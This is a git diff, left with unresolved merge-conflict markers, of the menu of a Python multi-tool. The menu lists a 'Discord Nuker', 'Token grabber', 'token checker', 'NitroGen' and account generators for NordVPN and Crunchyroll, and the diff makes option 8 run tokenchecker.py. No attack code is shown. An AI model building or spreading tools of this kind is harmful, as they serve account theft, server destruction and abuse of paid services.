@@ -52,9 +52,15 @@ def menu():
 [help]  [shutdown]
  ---------------------------------------------------------------
 [0] Exit                        
+<<<<<<< Updated upstream
 [1] Discord Nuker             [4] Proxy Scraper and Geo Ip   [7] Server Joiner    [10] Nordvpn Gen
 [2] Generator                 [5] Token grabber              [8]                  [11] Crunchyroll Gen
 [3] auto advertise            [6] NitroGen                   [9]
+=======
+[1]Discord Nuker             [4]Proxy Scraper and Geo Ip   [7]Server Joiner
+[2]Generator                 [5]Token grabber              [8]token checker
+[3]auto advertise            [6]NitroGen                   [9]
+>>>>>>> Stashed changes
                              
  
 {Fore.WHITE}
@@ -110,9 +116,13 @@ def menu():
         menu()
 
     if command == "8":
+<<<<<<< Updated upstream
         print("test")
         time.sleep(2)
         menu()
+=======
+        os.system("tokenchecker.py")
+>>>>>>> Stashed changes
 
     if command == "9":
         print("command")
